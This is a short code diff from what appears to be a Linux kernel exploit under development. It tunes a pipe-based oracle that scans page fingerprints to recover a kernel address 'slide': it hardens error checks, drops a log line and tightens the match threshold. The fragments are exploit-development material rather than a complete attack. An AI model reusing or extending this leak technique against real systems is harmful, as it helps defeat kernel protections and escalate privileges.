@@ -71,7 +71,7 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
 }
 
 void resize_pipe_slots(int pipefd[2], size_t slots) {
-  if (fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE) == -1) { pr_warning("resize_pipe_slots failed, using default size\n"); }
+  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
 }
 
 void make_pipe_object(int pipefd[2]) {
@@ -1034,7 +1034,6 @@ static int p0_fingerprint_score(
 }
 
 uintptr_t scan_p0_pipe_oracle(void) {
-  pr_info("p0 scan_p0_pipe_oracle entered\n");
   unsigned char page[PAGE_SIZE];
   size_t scan_size =
       p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
@@ -1090,7 +1089,7 @@ uintptr_t scan_p0_pipe_oracle(void) {
 
   pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
           changed_pages, best_score, second_score, best_slide);
-  if (changed_pages != 1 || best_score < 1 || best_score <= second_score) {
+  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
     return (uintptr_t)-1;
   }
   return best_slide;
